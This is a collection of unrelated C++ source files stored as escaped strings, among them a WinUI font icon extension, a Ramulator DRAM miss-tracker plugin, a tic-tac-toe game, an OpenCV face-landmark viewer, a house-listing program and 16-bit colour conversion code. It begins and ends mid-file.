FontIconExtension::FontWeight()\n\t{\n\t\treturn m_FontWeight;\n\t}\n\n\tvoid FontIconExtension::FontWeight(wut::FontWeight Value)\n\t{\n\t\tm_FontWeight = Value;\n\t}\n\n\thstring FontIconExtension::Glyph()\n\t{\n\t\treturn m_Glyph;\n\t}\n\n\tvoid FontIconExtension::Glyph(hstring Value)\n\t{\n\t\tm_Glyph = Value;\n\t}\n\n\tbool FontIconExtension::IsTextScaleFactorEnabled()\n\t{\n\t\treturn m_IsTextScaleFactorEnabled;\n\t}\n\n\tvoid FontIconExtension::IsTextScaleFactorEnabled(bool Value)\n\t{\n\t\tm_IsTextScaleFactorEnabled = Value;\n\t}\n\n\tbool FontIconExtension::MirroredWhenRightToLeft()\n\t{\n\t\treturn m_MirroredWhenRightToLeft;\n\t}\n\n\tvoid FontIconExtension::MirroredWhenRightToLeft(bool Value)\n\t{\n\t\tm_MirroredWhenRightToLeft = Value;\n\t}\n\n#pragma endregion\n\t\n/* FontIcon properties inherited from IconElement */\n#pragma region FontIcon properties inherited from IconElement\n\n\tmuxm::Brush FontIconExtension::Foreground()\n\t{\n\t\treturn m_Foreground;\n\t}\n\t\n\tvoid FontIconExtension::Foreground(muxm::Brush Value)\n\t{\n\t\tm_Foreground = Value;\n\t}\n\n#pragma endregion\n}",
    "#include <unordered_map>\n\n#include \"base/base.h\"\n#include \"dram_controller/controller.h\"\n#include \"dram_controller/plugin.h\"\n#include \"dram_controller/impl/pluginutil/device_config.h\"\n#include \"dram_controller/impl/plugin/miss_tracker.h\"\n\nnamespace Ramulator {\n\nclass MissTracker : public IControllerPlugin, public Implementation, public IMissTracker {\n    RAMULATOR_REGISTER_IMPLEMENTATION(IControllerPlugin, MissTracker, \"MissTracker\", \"Per Thread Miss Tracker.\")\n\nprivate:\n    DeviceConfig m_cfg;\n    std::unordered_map<int, int> m_read_ctrs;\n    std::unordered_map<int, int> m_write_ctrs;\n    std::vector<std::unordered_map<int, int>> m_bank_act_ctrs;\n\n    int m_clk = 0;\n\npublic:\n    void init() override { }\n\n    void setup(IFrontEnd* frontend, IMemorySystem* memory_system) override {\n        m_cfg.set_device(cast_parent<IDRAMController>());\n\n        m_bank_act_ctrs.resize(m_cfg.m_num_banks);\n    }\n\n    void update(bool request_found, ReqBuffer::iterator& req_it) override {\n        m_clk++;\n\n        if (!request_found) {\n            return;\n        }\n\n        auto& req = *req_it;\n        auto& req_meta = m_cfg.m_dram->m_command_meta(req.command);\n        auto& req_scope = m_cfg.m_dram->m_command_scopes(req.command);\n        \n        if (!(req_meta.is_opening && req_scope == m_cfg.m_row_level)) {\n            return; \n        }\n\n        switch(req.type_id) {\n        case Request::Type::Read:\n            safe_insert<int, int>(m_read_ctrs, req.source_id);\n            break;\n        case Request::Type::Write:\n            safe_insert<int, int>(m_write_ctrs, req.source_id);\n            break;\n        }\n\n        auto flat_bank_id = m_cfg.get_flat_bank_id(req);\n        safe_insert<int, int>(m_bank_act_ctrs[flat_bank_id], req.source_id);\n    }\n    \n    virtual int get_source_reads(int source_id) override {\n        return safe_read<int, int>(m_read_ctrs, source_id);\n    }\n\n    virtual int get_source_writes(int source_id) override {\n        return safe_read<int, int>(m_write_ctrs, source_id);\n    }\n\n    virtual int get_source_acts(int flat_bank_id, int source_id) override {\n        return safe_read<int, int>(m_bank_act_ctrs[flat_bank_id], source_id);\n    }\n\n    virtual int get_source_reqs(int source_id) override {\n        return get_source_reads(source_id) + get_source_writes(source_id);\n    }\n\n    virtual void reset_counters() override {\n        m_read_ctrs.clear();\n        m_write_ctrs.clear();\n        for (auto& bank_ctr : m_bank_act_ctrs) {\n            bank_ctr.clear();\n        }\n    }\n\nprivate:\n    template <typename key_t, typename ctr_t>\n    void safe_insert(std::unordered_map<key_t, ctr_t>& ctr_map, key_t source_id) {\n        if (ctr_map.find(source_id) == ctr_map.end()) {\n            ctr_map[source_id] = (ctr_t) 0;\n        }\n        ctr_map[source_id]++;\n    }\n\n    template <typename key_t, typename ctr_t>\n    ctr_t safe_read(std::unordered_map<key_t, ctr_t>& ctr_map, key_t source_id) {\n        if (ctr_map.find(source_id) == ctr_map.end()) {\n            return (ctr_t) 0;\n        }\n        return ctr_map[source_id];\n    }\n    \n};\n\n}       // namespace Ramulator\n",
    "#include \"episodio.h\"\r\n#include <numeric> // Para std::accumulate\r\n\r\nEpisodio::Episodio(const std::string& titulo, int temporada)\r\n    : titulo(titulo), temporada(temporada) {}\r\n\r\nvoid Episodio::agregarCalificacion(int calificacion) {\r\n    calificaciones.push_back(calificacion);\r\n}\r\n\r\ndouble Episodio::obtenerCalificacionPromedio() const {\r\n    if (calificaciones.empty()) {\r\n        return 0.0;\r\n    }\r\n    int suma = std::accumulate(calificaciones.begin(), calificaciones.end(), 0);\r\n    return static_cast<double>(suma) / calificaciones.size();\r\n}\r\n\r\nvoid Episodio::mostrar() const {\r\n    std::cout << \"Episodio: \" << titulo << \", Temporada: \" << temporada\r\n              << \", Calificacion Promedio: \" << obtenerCalificacionPromedio() << std::endl;\r\n}\r\n\r\nstd::ostream& operator<<(std::ostream& os, const Episodio& episodio) {\r\n    os << \"Episodio: \" << episodio.titulo << \", Temporada: \" << episodio.temporada\r\n       << \", Calificacion Promedio: \" << episodio.obtenerCalificacionPromedio();\r\n    return os;\r\n}\r\n",
    "#include \"functions.hpp\"\n#include <iostream>\n#include <algorithm>\nusing namespace std;\n\nnamespace MyNamespace {\n\nbool EightInNumber(int number) // \u041f\u0420\u041e\u0412\u0415\u0420\u041a\u0410 \u041d\u0410 \u0426\u0418\u0424\u0420\u0423 8 \u0412 \u0427\u0418\u0421\u041b\u0415 \n{\n    bool flag = false;\n    int digit = 0;\n    while (number != 0)\n    {\n        digit = number % 10;\n        if (digit == 8)\n        {\n            flag = true;\n        }\n        number /= 10;\n    }\n    return flag;\n}\n\nbool EightInRow(int *arr, int SIZE)\n{\n    bool flag = false;\n    for (int i = 0 ; i < SIZE ; i++)\n    {\n        if (EightInNumber(arr[i]))\n        {\n            flag = true;\n        }\n    }\n    return flag;\n}\n\nvoid SortArray(int *arr, int SIZE) // \u0421\u041e\u0420\u0422\u0418\u0420\u041e\u0412\u041a\u0410 \u041c\u0410\u0421\u0421\u0418\u0412\u0410 \u041f\u0423\u0417\u042b\u0420\u042c\u041a\u041e\u041c\n{\n    bool flag = true;\n    int temp, i = 0;\n    while (flag && (i < SIZE))\n    {\n        flag = false;\n        for (int j = 0 ; j < SIZE - 1 - i ; j++)\n        {\n            if (arr[j] > arr[j + 1])\n            {\n                temp = arr[j + 1];\n                arr[j + 1] = arr[j]; \n                arr[j] = temp;\n                flag = true;\n            }\n        }\n        i++;\n    }\n}\n\nbool MaxMinSum(int **arr, int SIZE) // \u0421\u0423\u041c\u041c\u0410 \u041c\u0418\u041d\u0418\u041c\u0423\u041c\u0410 \u0418 \u041c\u0410\u041a\u0421\u0418\u041c\u0423\u041c\u0410\n{\n    bool flag = false;\n    int mn = __INT_MAX__, mx = -2147483646;\n    for (int i = 0; i < SIZE ; i++)\n    {\n        for (int j = 0; j < SIZE ; j++)\n        {\n            mx = max(arr[i][j], mx);\n            mn = min(arr[i][j], mn);\n        }\n    }\n    if ((mn + mx) == 0)\n    {\n        flag = true;\n    }\n    return flag;\n}\n\nvoid readArray(int **arr, int SIZE) // \u0412\u0412\u041e\u0414 \u041c\u0410\u0421\u0421\u0418\u0412\u0410\n{\n    int n;\n    for (int i = 0 ; i < SIZE ; i++)\n    {\n        for (int j = 0 ; j < SIZE ; j++)\n        {\n            cout << \"i = \" << i << \" \" << \"j = \" << j << \" : \";\n            cin >> n;\n            arr[i][j] = n;\n        }\n    }  \n}\n\nvoid writeArray(int **arr, int SIZE) // \u0412\u042b\u0412\u041e\u0414 \u041c\u0410\u0421\u0421\u0418\u0412\u0410\n{\n    for (int i = 0 ; i < SIZE ; i++)\n    {\n        for (int j = 0 ; j < SIZE ; j++)\n        {\n            cout << arr[i][j] << \" \";\n        }\n        cout << endl;\n    }\n}\n\n\n\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nbool isWin(char game[3][3]) {\n\tbool win = false;\n\tif (game[0][0] == game[0][1] && game[0][1] == game[0][2] && (game[0][0] == 'X' || game[0][0] == 'O')) win = true;\n\tif (game[1][0] == game[1][1] && game[1][1] == game[1][2] && (game[1][0] == 'X' || game[1][0] == 'O')) win = true;\n\tif (game[2][0] == game[2][1] && game[2][1] == game[2][2] && (game[2][0] == 'X' || game[2][0] == 'O')) win = true;\n\t// column\n\tif (game[0][0] == game[1][0] && game[1][0] == game[2][0] && (game[0][0] == 'X' || game[0][0] == 'O')) win = true;\n\tif (game[0][1] == game[1][1] && game[1][1] == game[2][1] && (game[0][1] == 'X' || game[0][1] == 'O')) win = true;\n\tif (game[0][2] == game[1][2] && game[1][2] == game[2][2] && (game[0][2] == 'X' || game[0][2] == 'O')) win = true;\n\t// diagonal\n\tif (game[0][0] == game[1][1] && game[1][1] == game[2][2] && (game[0][0] == 'X' || game[0][0] == 'O')) win = true;\n\tif (game[2][0] == game[1][1] && game[0][2] == game[1][1] && (game[0][2] == 'X' || game[0][2] == 'O')) win = true;\n\treturn win;\n}\n\nint main() {\n\tint i, j;\n\tchar game[3][3] = { ' ',' ',' ',' ',' ',' ',' ',' ',' ' };\n\tchar player1 = 'X';\n\tchar player2 = 'O';\n\tbool turn = true;\n\tcout << \"X = player 1\" << endl << \"O = player 2\" << endl;\n\tfor (int n = 0; n < 9; n++) {\n\t\tturn = !turn;\n\t\tif (turn == false)\n\t\t\tcout << \"Player 1: \";\n\t\telse\n\t\t\tcout << \"Player 2: \";\n\t\tcout << \"Which cell to mark? i:[1..3], j[1..3]: \";\n\t\tcin >> i >> j;\n\t\t\n\t\tbool flag = false;\n\t\twhile (!flag) {\n\t\t\tif (i < 1 || i > 3 || j < 1 || j > 3 || game[i-1][j-1] != ' ') {\n\t\t\t\tcout << \"illegal input, please input again! \";\n\t\t\t\tcin >> i >> j;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tflag = true;\n\t\t\t}\n\t\t}\n\t\t\n\t\ti--;\n\t\tj--;\n\n\t\t/*\n\t\twhile (i < 0 || i > 2 || j < 0 || j > 2)\n\t\t{\n\t\t\tcout << \"illegal input, please input again!\";\n\t\t\tcin >> i >> j;\n\t\t\ti--;\n\t\t\tj--;\n\t\t}\n\t\twhile (game[i][j] != ' ') {\n\t\t\tcout << \"illegal input, please input again!\";\n\t\t\tcin >> i >> j;\n\t\t\ti--;\n\t\t\tj--;\n\t\t}\n\t\t*/\n\n\t\tif (turn == false)\n\t\t\tgame[i][j] = 'X';\n\t\telse\n\t\t\tgame[i][j] = 'O';\n\n\t\tif (isWin(game)) {\n\t\t\tcout << \"Win!\" << endl;\n\t\t\tbreak;\n\t\t}\n\t\ti = 3;\n\t}\n\tif (i == 3)\n\t\tcout << \"Tie!\" << endl;\n\n\tcout << game[0][0] << \" \" << game[0][1] << \" \" << game[0][2] << endl;\n\tcout << game[1][0] << \" \" << game[1][1] << \" \" << game[1][2] << endl;\n\tcout << game[2][0] << \" \" << game[2][1] << \" \" << game[2][2] << endl;\n}",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QFileDialog>\n#include <QMessageBox>\n#include <QTimer>\n#include <opencv2/imgcodecs.hpp>\n#include <opencv2/face.hpp>\n#include <opencv2/highgui.hpp>\n#include <QDebug>\n#include <opencv2/cudaimgproc.hpp>\n#include <opencv2/core/cuda.hpp>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n    , selectedCPUimage(new cv::Mat())\n    , selectedGPUImage(new cv::cuda::GpuMat())\n    , cap(new cv::VideoCapture())\n{\n    ui->setupUi(this);\n\n    timer = new QTimer(this);\n\n    try {\n\n        faceCascade = faceCascade->create(lbpPath.toStdString());\n    } catch (cv::Exception &e) {\n\n        qDebug() << \"OpenCV hatas\u0131: \" << e.what();\n    }\n\n}\n\nMainWindow::~MainWindow()\n{\n    cap.release();\n    disconnect(timer,&QTimer::timeout,this,&MainWindow::updateFrame);\n    delete ui;\n}\n\nvoid MainWindow::on_start_clicked()\n{\n    try {\n        cap->open(0);\n        if (!cap->isOpened()) {\n            QMessageBox::warning(this, \"Camera is not opening\", \"Check your cameras\");\n            return;\n        }\n\n        timer->start(30); // 30ms\n        connect(timer, &QTimer::timeout,this,&MainWindow::updateFrame);\n    } catch (const cv::Exception &e) {\n        qDebug() << \"OpenCV hatas\u0131: \" << e.what();\n    } catch (const std::exception &e) {\n        qDebug() << \"Genel hata: \" << e.what();\n    } catch (...) {\n        qDebug() << \"Bilinmeyen bir hata olu\u015ftu.\";\n    }\n\n}\n\nvoid MainWindow::updateFrame()\n{\n    try {\n\n        // GpuMat ve CPU Mat nesneleri\n        cv::Ptr<cv::cuda::GpuMat> gpuFrame = cv::makePtr<cv::cuda::GpuMat>();\n        cv::Ptr<cv::Mat> frameCPU = cv::makePtr<cv::Mat>();\n\n        // Kameradan bir frame al\n        cv::Ptr<cv::Mat> frameBGR = cv::makePtr<cv::Mat>();\n        if (cap->read(*frameBGR)) {\n            // BGR frame'i GPU'ya y\u00fckle\n            gpuFrame->upload(*frameBGR);\n\n            // GPU \u00fczerinde BGR'den RGB'ye d\u00f6n\u00fc\u015f\u00fcm\n            cv::cuda::cvtColor(*gpuFrame, *gpuFrame, cv::COLOR_BGR2RGB);\n\n            // GPU \u00fczerinde RGB'den Grayscale'e d\u00f6n\u00fc\u015f\u00fcm\n            cv::Ptr<cv::cuda::GpuMat> gpuGrayFrame = cv::makePtr<cv::cuda::GpuMat>();\n            cv::cuda::cvtColor(*gpuFrame, *gpuGrayFrame, cv::COLOR_RGB2GRAY);\n\n            // Y\u00fcz tespiti\n            cv::Ptr<cv::cuda::GpuMat> gpuFrameMemory = cv::makePtr<cv::cuda::GpuMat>();\n            faceCascade->detectMultiScale(*gpuGrayFrame, *gpuFrameMemory);\n\n            std::vector<cv::Rect> faces;\n            faceCascade->convert(*gpuFrameMemory, faces);\n            cv::Mat facesMat(faces.size(), 1, CV_32SC4, &faces[0]);\n\n            cv::Ptr<cv::face::Facemark> facemark = cv::face::FacemarkLBF::create();\n            facemark->loadModel(yamlPath.toStdString());\n\n            // GPU'dan CPU'ya indirme\n            gpuFrame->download(*frameCPU);\n\n            std::vector<std::vector<cv::Point2f>> landmarks;\n            if (facemark->fit(*frameCPU, facesMat, landmarks)) {\n                for (size_t i = 0; i < landmarks.size(); i++) {\n                    // Delaunay triangulation i\u00e7in y\u00fcz \u00e7er\u00e7evesini haz\u0131rlay\u0131n\n                    cv::Rect rect(0, 0, frameCPU->cols, frameCPU->rows);\n                    cv::Subdiv2D subdiv(rect);\n\n                    // T\u00fcm landmark noktalar\u0131n\u0131 subdiv'e ekleyin\n                    for (size_t j = 0; j < landmarks[i].size(); j++) {\n                        subdiv.insert(landmarks[i][j]);\n                        cv::circle(*frameCPU, landmarks[i][j], 3, cv::Scalar(0, 0, 255), -1);\n                    }\n\n                    // Delaunay triangulation \u00e7izimi\n                    drawDelaunay(*frameCPU, subdiv, cv::Scalar(255, 255, 255));\n                }\n            }\n\n            // OpenCV Mat'\u0131 QImage'e d\u00f6n\u00fc\u015ft\u00fcr\n            QImage img(frameCPU->data, frameCPU->cols, frameCPU->rows, frameCPU->step, QImage::Format_RGB888);\n\n            // QLabel \u00fczerinde g\u00f6r\u00fcnt\u00fcy\u00fc g\u00f6ster\n            ui->label->setPixmap(QPixmap::fromImage(img));\n            ui->label->setScaledContents(true);\n        }\n    } catch (const cv::Exception &e) {\n        qDebug() << \"OpenCV hatas\u0131: \" << e.what();\n    } catch (const std::exception &e) {\n        qDebug() << \"Genel hata: \" << e.what();\n    } catch (...) {\n        qDebug() << \"Bilinmeyen bir hata olu\u015ftu.\";\n    }\n}\n\nvoid MainWindow::on_close_clicked()\n{\n    cap->release();\n    disconnect(timer,&QTimer::timeout,this,&MainWindow::updateFrame);\n}\n\n\nvoid MainWindow::on_browse_clicked()\n{\n    try {\n        QString fileName = QFileDialog::getOpenFileName(this, \"Choose a picture\", \"\", \"Images (*.png *.xpm *.jpg)\");\n\n        if (!fileName.isEmpty()) {\n            // CPU'dan GPU'ya g\u00f6r\u00fcnt\u00fcy\u00fc aktarma\n            *selectedCPUimage = cv::imread(fileName.toStdString());\n            if (selectedCPUimage->empty()) {\n                throw std::runtime_error(\"G\u00f6r\u00fcnt\u00fc y\u00fcklenemedi.\");\n            }\n\n            // Convert to grayscale\n            cv::Mat grayImage;\n            cv::cvtColor(*selectedCPUimage, grayImage, cv::COLOR_BGR2GRAY);\n\n            // ",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n\r\nconst int MAKS_JUMLAH_RUMAH = 1000; \r\n\r\n\r\nstruct Rumah { \r\n    int id;                   \r\n    string alamat;           \r\n    string harga;           \r\n    bool terjual;           \r\n};\r\n\r\n\r\nvoid tambahRumah(Rumah* daftarRumah, int* jumlah) {\r\n    if (*jumlah >= MAKS_JUMLAH_RUMAH) {\r\n        cout << \"Data rumah penuh!\" << endl;\r\n        return;\r\n    }\r\n\r\n    Rumah rumahBaru;\r\n    bool idValid = false;\r\n\r\n\r\n    while (!idValid) {\r\n        cout << endl;\r\n        cout << \"Masukkan ID rumah: \";\r\n        cin >> rumahBaru.id;\r\n\r\n        idValid = true;\r\n        for (int i = 0; i < *jumlah; i++) {\r\n            if (daftarRumah[i].id == rumahBaru.id) {\r\n                cout << \"ID rumah sudah ada, silakan masukkan ID yang berbeda.\" << endl;\r\n                idValid = false;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    cout << \"Masukkan alamat rumah: \";\r\n    cin.ignore(); \r\n    getline(cin, rumahBaru.alamat);\r\n    cout << \"Masukkan harga rumah: \";\r\n    getline(cin, rumahBaru.harga);\r\n    rumahBaru.terjual = false;\r\n\r\n    daftarRumah[*jumlah] = rumahBaru;\r\n    (*jumlah)++;\r\n    cout << \"Rumah berhasil ditambahkan!\" << endl;\r\n}\r\n\r\nvoid tampilkanRumah(const Rumah* daftarRumah, int jumlah) {\r\n    if (jumlah == 0) {\r\n        cout << endl;\r\n        cout << \"Belum ada data rumah.\" << endl;\r\n        return;\r\n    }\r\n    cout << endl;\r\n    cout << \"=== Daftar Rumah ===\" << endl;\r\n    for (int i = 0; i < jumlah; i++) {\r\n        cout << \"ID: \" << daftarRumah[i].id << endl;\r\n        cout << \"Alamat: \" << daftarRumah[i].alamat << endl;\r\n        cout << \"Harga: \" << daftarRumah[i].harga << endl;\r\n        cout << \"Status: \" << (daftarRumah[i].terjual ? \"Terjual\" : \"Belum Terjual\") << endl;\r\n        cout << \"------------------------\" << endl;\r\n    }\r\n}\r\n\r\nvoid perbaruiRumah(Rumah* daftarRumah, int jumlah) {\r\n    int id;\r\n    cout << endl;\r\n    cout << \"Masukkan ID rumah yang ingin diperbarui: \";\r\n    cin >> id;\r\n\r\n    for (int i = 0; i < jumlah; i++) {\r\n        if (daftarRumah[i].id == id) {\r\n            cout << \"Masukkan alamat baru: \";\r\n            cin.ignore();\r\n            getline(cin, daftarRumah[i].alamat);\r\n            cout << \"Masukkan harga baru: \";\r\n            getline(cin, daftarRumah[i].harga);\r\n            cout << \"Informasi rumah berhasil diperbarui!\" << endl;\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Rumah dengan ID \" << id << \" tidak ditemukan.\" << endl;\r\n}\r\n\r\nvoid perbaruiStatusRumah(Rumah* daftarRumah, int jumlah) {\r\n    int id;\r\n    cout << endl;\r\n    cout << \"Masukkan ID rumah yang ingin diperbarui statusnya: \";\r\n    cin >> id;\r\n\r\n    for (int i = 0; i < jumlah; i++) {\r\n        if (daftarRumah[i].id == id) {\r\n            cout << \"Apakah rumah sudah terjual? (1 = Ya, 0 = Tidak): \";\r\n            cin >> daftarRumah[i].terjual;\r\n            cout << \"Status rumah berhasil diperbarui!\" << endl;\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Rumah dengan ID \" << id << \" tidak ditemukan.\" << endl;\r\n}\r\n\r\nvoid hapusRumah(Rumah* daftarRumah, int* jumlah) {\r\n    int id;\r\n    cout << endl;\r\n    cout << \"Masukkan ID rumah yang ingin dihapus: \";\r\n    cin >> id;\r\n\r\n    for (int i = 0; i < *jumlah; i++) {\r\n        if (daftarRumah[i].id == id) {\r\n            for (int j = i; j < (*jumlah) - 1; j++) {\r\n                daftarRumah[j] = daftarRumah[j + 1];\r\n            }\r\n            (*jumlah)--; \r\n            cout << \"Rumah berhasil dihapus!\" << endl;\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Rumah dengan ID \" << id << \" tidak ditemukan.\" << endl;\r\n}\r\n\r\n\r\nvoid tampilkanMenu() {\r\n    cout << endl;\r\n    cout << \"=== Sistem Agen Perumahan ===\" << endl;\r\n    cout << \"1. Tambah Rumah\" << endl;\r\n    cout << \"2. Lihat Daftar Rumah\" << endl;\r\n    cout << \"3. Update Rumah\" << endl;\r\n    cout << \"4. Update Status Rumah\" << endl;\r\n    cout << \"5. Hapus Rumah\" << endl;\r\n    cout << \"6. Keluar\" << endl;\r\n    cout << \"Pilih menu: \";\r\n}\r\n\r\nint main() {\r\n    Rumah daftarRumah[MAKS_JUMLAH_RUMAH]; \r\n    int jumlahRumah = 0; \r\n\r\n    int pilihan;\r\n    do {\r\n        tampilkanMenu();\r\n        cin >> pilihan;\r\n\r\n        switch (pilihan) {\r\n            case 1:\r\n                tambahRumah(daftarRumah, &jumlahRumah);\r\n                break;\r\n            case 2:\r\n                tampilkanRumah(daftarRumah, jumlahRumah);\r\n                break;\r\n            case 3:\r\n                perbaruiRumah(daftarRumah, jumlahRumah);\r\n                break;\r\n            case 4:\r\n                perbaruiStatusRumah(daftarRumah, jumlahRumah);\r\n                break;\r\n            case 5:\r\n                hapusRumah(daftarRumah, &jumlahRumah);\r\n                break;\r\n            case 6:\r\n                cout << \"Terima kasih telah menggunakan sistem agen perumahan!\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Pilihan tidak valid. Silakan coba lagi.\" << endl;\r\n        }\r\n    } while (pilihan != 6);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_paymob_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*************************************************\r\n Colour Functions\r\n \r\n   This file contains functions to pack and unpack\r\n   16-bit colours as well as palettised colours.\r\n   \r\n  Note: The YUV conversion method requires two\r\n  texels worth of data, so the pointers are stored\r\n  and only written to every other texel.\r\n\r\n**************************************************/\r\n\r\n#include <assert.h>\r\n\r\n#include \"Util.h\"\r\n#include \"Colour.h\"\r\n\r\n\r\nunsigned char g_nOpaqueAlpha = 0xFF;\r\n\r\n\r\n//////////////////////////////////////////////////////////////////////\r\n// Computes the correct 16-bit texel value for the given colour format\r\n// it takes a pointer to the texel because the YUV conversion sets\r\n// two texels at once.\r\n//////////////////////////////////////////////////////////////////////\r\nvoid ComputeTexel( int x, int y, unsigned short int* texel, unsigned char a, unsigned char r, unsigned char g, unsigned char b, ImageColourFormat icf )\r\n{\r\n    switch( icf )\r\n    {\r\n        case ICF_565:   *texel = MAKE_565( r, g, b ); break;\r\n        case ICF_555:   *texel = MAKE_1555( 0, r, g, b ); break;\r\n        case ICF_1555:  *texel = MAKE_1555( a, r, g, b ); break;\r\n        case ICF_4444:  *texel = MAKE_4444( a, r, g, b ); break;\r\n        case ICF_YUV422:\r\n        {\r\n            static unsigned short int* _texel;\r\n            static unsigned char _r;\r\n            static unsigned char _g;\r\n            static unsigned char _b;\r\n\r\n\t\t\tif( !(x&1) ) //even pixel\r\n\t\t\t{\r\n                _texel = texel;\r\n                _r = r;\r\n                _g = g;\r\n                _b = b;\r\n\t\t\t}\r\n\t\t\telse //odd pixel\r\n\t\t\t{\r\n                //compute each pixel's Y\r\n\t\t\t    unsigned Y0 = (unsigned)(0.299*_r + 0.587*_g + 0.114*_b);\r\n                unsigned Y1 = (unsigned)(0.299*r + 0.587*g + 0.114*b);\r\n\r\n                //average both pixel's rgb values\r\n                r = ( r + _r ) / 2;\r\n                g = ( g + _g ) / 2;\r\n                b = ( b + _b ) / 2;\r\n\r\n                //compute UV\r\n\t\t\t\tunsigned U = (unsigned)(128.0f - 0.14*r - 0.29*g + 0.43*b);\r\n\t\t\t\tunsigned V = (unsigned)(128.0f + 0.36*r - 0.29*g - 0.07*b);\r\n                *_texel = (Y0<<8) | U;\r\n                *texel = (Y1<<8) | V;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n        }\r\n        default: assert(false);\r\n    }\r\n}\r\n\r\n\r\n\r\n//////////////////////////////////////////////////////////////////////\r\n// Unpacks the 16-bit texel into ARGB values using the given format\r\n// it takes pointers to the argb values instead of passing them by\r\n// reference because two sets of rgb values are changed at once by\r\n// the YUV conversion\r\n//////////////////////////////////////////////////////////////////////\r\nvoid UnpackTexel( int x, int y, unsigned short int texel, unsigned char* a, unsigned char* r, unsigned char* g, unsigned char* b, ImageColourFormat icf )\r\n{\r\n    switch( icf )\r\n    {\r\n        case ICF_565:\r\n            if(a) *a = g_nOpaqueAlpha;\r\n            *r = ( texel & 0xF800 ) >> 8;\r\n            *g = ( texel & 0x07E0 ) >> 3;\r\n            *b = ( texel & 0x001F ) << 3;\r\n            break;\r\n\r\n        case ICF_555:\r\n            if(a) *a = g_nOpaqueAlpha;\r\n            *r = (texel & 0x7C00) >> 7;\r\n            *g = (texel & 0x03E0) >> 2;\r\n            *b = (texel & 0x001F) << 3;\r\n            break;\r\n\r\n        case ICF_1555:\r\n            if(a) *a = (texel & 0x8000) ? 0xFF : 0x00;\r\n            *r = (texel & 0x7C00) >> 7;\r\n            *g = (texel & 0x03E0) >> 2;\r\n            *b = (texel & 0x001F) << 3;\r\n            break;\r\n\r\n        case ICF_4444:\r\n            if(a) *a = ( texel & 0xF000 ) >> 8;\r\n            *r = ( texel & 0x0F00 ) >> 4;\r\n            *g = ( texel & 0x00F0 );\r\n            *b = ( texel & 0x000F ) << 4;\r\n            break;\r\n\r\n        case ICF_YUV422:\r\n        {\r\n            if(a) *a = g_nOpaqueAlpha;\r\n            static unsigned char* _r, * _g, * _b;\r\n            static unsigned short int _texel;\r\n\r\n            if( !(x&1) ) //even pixel\r\n            {\r\n                _texel = texel;\r\n                _r = r;\r\n                _g = g;\r\n                _b = b;\r\n            }\r\n            else //odd pixel\r\n            {\r\n                //note: these must be declared as signed otherwise we have to spend\r\n                //several days trying to get the YUV->RGB conversion to work and\r\n                //wondering why it isn't. :-)\r\n                signed int Y0 = ( _texel & 0xFF00 ) >> 8, U = ( _texel & 0x00FF );\r\n                signed int Y1 = (  texel & 0xFF00 ) >> 8, V = (  texel & 0x00FF );\r\n\r\n                *_r = Limit255(int(Y0 + 1.375*(V-128)));\r\n                *_g = Limit255(int(Y0 - 0.6875*(V-128)-0.34375*(U-128)));\r\n                *_b = Limit255(int(Y0 + 1.71875*(U-128)));\r\n\r\n                *r =  Limit255(int(Y1 + 1.375*(V-128)));\r\n                *g =  Limit255(int(Y1 - 0.6875*(V-128)-0.34375*(U-128)));\r\n                *b =  Limit255(int(Y1 + 1.71875*(U-128)));\r\n            }\r\n            break;\r\n        }\r\n        default: assert(false);\r\n    }\r\n}\r\n\r\n\r\n///////////////////////////////////",
    "#include <iostream>\r\n#include <vector>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nint min_r(vector <int>& r_bridge){\r\n    int min_r = r_bridge[0];\r\n    int k = 0;\r\n    for (int i = 1; i<r_bridge.size(); ++i){\r\n        if (r_bridge[i]<min_r){\r\n            min_r = r_bridge[i];\r\n            k = i;\r\n        }\r\n    }\r\n    return k;\r\n}\r\n\r\npair<int, int> min12_l(vector<int>& l_bridge){\r\n    int min_l1 = l_bridge[0], min_l2 = INT_MAX;\r\n    int k = 0, j = 0;\r\n    for (int i = 1; i < l_bridge.size(); ++i) {\r\n        if (l_bridge[i] < min_l1) {\r\n            min_l2 = min_l1;\r\n            min_l1 = l_bridge[i];\r\n            j = k;\r\n            k = i;\r\n        } else if (l_bridge[i] < min_l2) {\r\n            min_l2 = l_bridge[i];\r\n            j = i;\r\n        }\r\n    }\r\n    return {k, j};\r\n\r\n}\r\n\r\npair<int, int> max12_l(vector <int>& l_bridge){\r\n    int max_l1 = l_bridge[0], max_l2 = INT_MIN;\r\n    int k = 0, j = 0;\r\n    for (int i = 1; i < l_bridge.size(); ++i) {\r\n        if (l_bridge[i] > max_l1) {\r\n            